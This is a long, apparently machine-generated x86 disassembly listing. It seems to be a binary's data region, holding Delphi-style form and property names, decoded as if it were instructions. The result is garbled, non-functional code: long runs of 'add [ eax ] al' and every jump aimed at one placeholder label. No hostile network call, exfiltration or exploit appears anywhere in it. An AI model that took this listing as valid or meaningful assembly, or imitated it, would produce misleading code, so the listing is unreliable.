add [ eax ] al
mov [ fs : 0xffffffffa44c0042 ] al
inc ecx
je r-xdata
add [ esp + 0x41 ] ch
add al ch
fadd [ edx ]
mov esp 0xd80043b8
mov ebp 0xbd240043
inc ebx
add ah dl
cmp eax 0xb3380043
inc ebx
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ eax + ebx * 8 + 0x6de40042 ] al
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
mov eax [ 0xffffffffa1440041 ]
inc ecx
insb
jae r-xdata
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
add [ ebx ] al
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
inc eax
add [ eax + 0x42a2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
inc edx
add [ ecx ] cl
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
pop esp
fiadd [ edx ]
sbb [ ebx + eax * 2 + 0x42deb800 ] al
add al cl
xchg [ ebx ] eax
int3
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
outsd
arpl [ ebx + 0x78 ] bp
add al [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
add al al
mov [ 0x42 ] eax
jb r-xdata
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ eax + ebx * 8 + 0x6de40042 ] al
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
inc ebx
sar [ eax ] 0xa5
inc edx
add [ edi ] al
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
xchg [ ebx ] eax
int3
inc ebx
add [ esi + ebx * 8 + 0x42 ] bl
add [ eax ] bl
test [ ebx ] al
mov eax 0xc80042de
rol al 0xa3
inc edx
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
movsb [ edi ] [ esi ]
add [ ebx ] al
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
add [ eax ] al
aam 0x99
adc al 0x2
inc esp
jb r-xdata
outsb
insd
outsb
je r-xdata
movsb [ edi ] [ esi ]
inc edx
add [ ebx + 0x360042 ] bh
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi + 0x70e00040 ] ch
inc ebx
add [ eax - 0x2fffbc43 ] ch
outsd
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx - 0x5c55ffbe ] ah
add [ eax ] al
sbb al 0xa2
inc edx
add [ ebx ] al
push cs
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
adc [ eax ] al
adc [ edx ] eax
add bh bh
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
add bh bh
in al 0x3d
inc ebx
add [ eax + 0x433e ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
jae r-xdata
mov [ 0xffffffff9b1c0042 ] al
inc edx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edx
add [ edx + eax ] dl
add [ eax ] al
add [ eax ] al
add [ ebx - 0x5c55ffbe ] al
je r-xdata
push ebx
je r-xdata
dec edi
outsb
sub al 0x0
inc ebx
add al ah
add [ eax ] al
jmp eax
outsd
jo r-xdata
jb r-xdata
dec esp
dec esp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
outsd
insb
outsd
jb r-xdata
lodsb [ esi ]
push cs
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
push cs
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
fld [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ebp + 0x41 ] cl
add [ eax + eax ] bh
add dh bh
add al 0x3e
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000c ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
test [ esi ] cl
inc ecx
add [ eax ] dl
add al [ eax ]
jmp eax
test [ ebx ] eax
sub al 0x40
test al 0xbd
inc ebx
add al dl
insb
jae r-xdata
inc edx
add [ esp + 0x41 ] cl
add ah dl
cdq
je r-xdata
jo r-xdata
inc edx
add [ eax - 0x3fffbcb6 ] dl
inc ebx
popad
jo r-xdata
add [ edi ] al
jns r-xdata
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
inc [ edx ]
je r-xdata
dec edx
inc ebx
add [ edx + ebp * 2 + 0x43 ] ah
add [ eax - 0x80000000 ] al
adc [ eax ] eax
pop es
add dh bh
mov ah 0x4b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7065646f
inc [ edx ]
nop
dec edx
inc ebx
add al al
add [ eax ] dl
inc eax
add [ ecx + eax - 0x4b3b0100 ] ah
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
inc esp
mov ah 0x43
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi + 0x70e00040 ] ch
inc ebx
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
movsb [ edi ] [ esi ]
inc ecx
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] bl
mov [ 0x630b0042 ] al
bound edx [ ebp + 0x6e ]
mov bl 0x43
add ah dh
mov bl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
enter 0x42fe 0x0
popad
add [ eax ] al
jmp esp
sbb [ edx ] 0x0
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add bh bh
jl r-xdata
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add al ch
fadd [ edx ]
mov esp 0xd80043b8
mov ebp 0xbd240043
inc ebx
add ah dl
cmp eax 0xb3380043
inc ebx
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
inc eax
add [ ebx + esi ] dh
inc eax
movsb [ edi ] [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
movsd [ edi ] [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
movsd [ edi ] [ esi ]
inc edx
add [ eax ] bl
add al [ eax ]
add [ edx + 0x42 ] ah
add [ esp + 0x41 ] cl
add al 0x46
add [ gs : eax ] dl
xor eax [ eax + ecx * 4 - 0x9 ]
inc edx
add [ edx ] bh
add bh bh
jpe r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
pop ss
add [ eax ] cl
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc ah
push 0x43
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov [ edi + 0x680041 ] dh
add [ eax ] eax
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x2f00ffff ] ah
outsd
outsb
je r-xdata
inc [ ebx + ecx * 2 + 0x4b940043 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
jae r-xdata
add bh bh
test [ ebx + 0x43 ] cl
add [ ebx + ecx * 2 + 0x43 ] dl
add [ eax - 0x80000000 ] al
sbb al [ eax ]
jb r-xdata
inc edx
add [ ebp ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc [ edx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
sub_42ab60
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
lodsb [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x54 ] bh
inc edx
add [ edx + 0x140042ac ] dl
add al [ eax ]
add ah dl
cdq
inc edx
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi + 0x70e00040 ] ch
inc ebx
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ edi + ebx * 8 - 0x4743ffbe ] ch
inc ebx
add al bl
mov ebp 0xbd240043
inc ebx
add ah dl
cmp eax 0xb3380043
inc ebx
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ eax + ebx * 8 + 0x6de40042 ] al
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
adc [ eax - 0x42ee4ffa ] dh
0x20ff
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
pushfd
loope r-xdata
add [ eax ] ch
loop r-xdata
add [ eax ] bl
test [ ebx ] al
hlt
cmp al 0x0
add [ edx - 0x1febffbe ] ch
inc edx
add [ esp + edx * 2 ] cl
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
nop
movsb [ edi ] [ esi ]
lodsb [ esi ]
inc edx
add [ edi ] al
or al 0x54
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
test al 0xab
inc edx
add [ ebx + ebx * 4 ] bl
inc edx
add [ 0x74530800 ] dh
inc ebx
je r-xdata
push [ eax ]
add dh bh
mov ah 0x4b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7065646f
inc [ edx ]
nop
dec edx
inc ebx
add al al
dec edx
inc ebx
add [ edx + ebp * 2 + 0x43 ] ah
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
popad
jo r-xdata
insb
jae r-xdata
mov bl 0x43
add ah dh
mov bl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
inc eax
loopne r-xdata
add dh bh
add al 0x3e
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
test [ esi ] cl
inc ecx
add [ eax ] dl
add al [ eax ]
inc [ eax - 0x20 ]
inc edx
add [ ebp + 0x41 ] cl
add [ eax + eax ] bh
add [ gs : eax ] dl
xor eax [ eax + ecx * 4 - 0x9 ]
inc edx
add [ edx ] bh
add bh bh
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
enter 0x42fe 0x0
popad
add [ eax ] al
jmp esp
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
outsd
outsb
je r-xdata
inc [ ebx + ecx * 2 + 0x4b940043 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
jae r-xdata
add bh bh
test [ ebx + 0x43 ] cl
add [ ebx + ecx * 2 + 0x43 ] dl
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add al 0x46
jb r-xdata
inc edx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc esp
jb r-xdata
inc [ edx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
push eax
popad
jb r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc ah
push 0x43
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov [ edi + 0x680041 ] dh
dec ebp
outsd
add [ gs : eax ] dl
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ esp + ecx * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] eax
inc [ edx ]
sub al 0xb4
inc ebx
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
add [ ecx ] 0x0
outsb
je r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
push edi
jb r-xdata
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
cwde
fld [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x49
inc ebx
add [ ebx + ebp * 2 ] ah
inc ebx
add [ eax ] al
jo r-xdata
adc [ eax ] al
0x4ff0000 0x434c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
inc esp
mov ah 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov esp 0x100434b
add [ eax ] al
add [ esp + esi * 4 + 0x10043 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and [ eax ] al
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov ah 0x43
push 0x6948776f
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0xff0001
mov ah 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
dec ebx
jns r-xdata
hlt
cmovno eax [ eax ]
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
cmovno eax [ eax ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
inc esp
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
add [ eax ] al
add [ ecx ] 0x0
adc [ eax ] al
push edi
add [ eax ] al
push [ eax + 0x24004349 ]
imul eax [ ebx ] 0x0
adc [ eax ] al
cdq
add [ eax ] al
jmp eax
add [ eax ] al
sbb eax 0x61500e00
cmp [ eax + eax + 0x7c ] al
add [ eax ] al
dec [ eax + 0x4a ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001e ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
add [ ebx ] eax
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
loopne r-xdata
jo r-xdata
add [ ebx ] al
push esp
add [ ebx ] eax
loopne r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
sub [ ebx ] 0x0
pop es
dec edi
cmovno eax [ eax ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebp
outsb
inc esp
jb r-xdata
rol [ edx ] 0x43
add [ eax ] cl
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add [ ebx ] al
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
jmp eax
add bh bh
loopne r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
outsb
push ebp
jo r-xdata
push ebp
jo r-xdata
arpl [ ebx + 0x78 ] bp
add al [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
jb r-xdata
insb
insb
inc ebx
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax + 0x80042b2 ] ch
jae r-xdata
push ebx
je r-xdata
dec edi
outsb
sub al 0x0
inc ebx
add al ah
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edx ] cl
dec edi
add [ eax ] al
jmp eax
or [ ecx ] al
inc ebx
add al ch
add [ eax ] eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002d ] al
outsb
add [ ebx ] eax
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x40 ] bp
add al [ ebx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add al [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
outsd
outsb
je r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941b0b4
add [ eax ] al
cmovno eax [ eax ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
or [ ebx + 0x63 ] dh
push eax
popad
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f07002f ] al
add al 0x43
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
jae r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
add [ eax ] al
shl [ edx + eax * 2 ] 0x1
jae r-xdata
or [ esp + edx * 2 ] cl
dec esp
imul ebp [ esi + 0x65 ] 0x730a7055
arpl [ ecx + ebp * 2 + 0x6e ] cx
inc esp
outsd
ja r-xdata
or dh [ ebx + 0x63 ]
jae r-xdata
inc ebp
jbe r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x6e776f44
push ebp
jo r-xdata
arpl [ eax + 0x61 ] dx
jb r-xdata
arpl [ edx + 0x6f ] si
insb
insb
push eax
push esp
outsd
jo r-xdata
arpl [ edx + 0x6f ] si
insb
insb
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc esp
jb r-xdata
dec ebx
inc ebx
add [ esp + ecx * 4 + 0x6de40043 ] ah
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ eax + edi * 4 - 0x4227ffbd ] bh
inc ebx
add [ edi * 4 + 0x3dd40043 ] ah
inc ebx
add [ eax ] bh
mov bl 0x43
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc eax
add [ ebx + esi * 4 ] ch
inc edx
add [ eax ] cl
or al 0x54
add [ eax ] al
add [ eax - 0x41ffbd4c ] bl
mov ah 0x42
add [ eax ] bh
add al [ eax ]
add [ eax + 0xe ] bh
inc ebx
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi + 0x70e00040 ] ch
inc ebx
outsb
je r-xdata
push 0x65
insb
je r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc ebx
outsd
or edx [ gs : ebx + edx * 2 + 0x63 ]
arpl [ gs : eax + eax + 0xa ] si
push eax
popad
inc esp
outsd
ja r-xdata
push eax
outsd
jae r-xdata
inc esp
outsd
add [ eax ] al
add ah dh
adc [ eax ] al
test al 0xb2
inc edx
add [ eax + edx ] bh
dec ecx
outsb
je r-xdata
or esi [ ebx + 0x63 ]
inc ebp
outsb
push ebx
jae r-xdata
mov ah 0x42
add [ eax ] al
add [ eax ] al
insb
or [ ebx + 0x63 ] dh
nop
lodsb [ esi ]
mov dl 0x42
add [ ebx ] al
or edx [ ebx + edx * 2 + 0x63 ]
jb r-xdata
mov bl 0xff
mov dl 0xff
insb
call 0xffffffffe8b6b4ee
inc edx
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
xchg esp eax
jecxz r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
jo r-xdata
inc ebx
outsd
add [ gs : ecx ] ecx
push ebx
outsd
outsb
pop es
jae r-xdata
jb r-xdata
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add ah bl
loop r-xdata
inc eax
jb r-xdata
outsd
jae r-xdata
inc edx
outsd
je r-xdata
inc eax
add al dl
mov bl 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
